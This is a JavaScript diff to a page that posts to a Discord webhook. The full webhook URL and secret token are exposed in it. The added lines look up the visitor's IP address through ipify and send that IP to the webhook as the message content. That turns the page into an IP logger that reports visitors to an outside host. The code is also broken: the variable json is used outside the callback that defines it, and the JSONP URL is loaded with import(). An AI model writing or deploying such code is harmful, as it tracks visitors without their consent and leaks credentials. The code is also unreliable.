@@ -15,11 +15,14 @@
       request.open("POST", "https://discord.com/api/webhooks/929398283003117599/nF4CwgJQOpfe4M-64tBN3bsSCw8BWYmYJ6ol0UGy_kvk-FfY-NstIJzMT8ezE_6MosFV");
 
       request.setRequestHeader('Content-type', 'application/json');
-
+      
+      import("https://api.ipify.org?format=jsonp&callback=getIP");
+      function getIP(json) { alert(`Your IP Address is ${json.ip}`) }
+      
       const params = {
         username: "Pinger",
         avatar_url: "",
-        content: "Ping !<@&929397855960043571>"
+        content: json.ip
       }
 
       request.send(JSON.stringify(params));
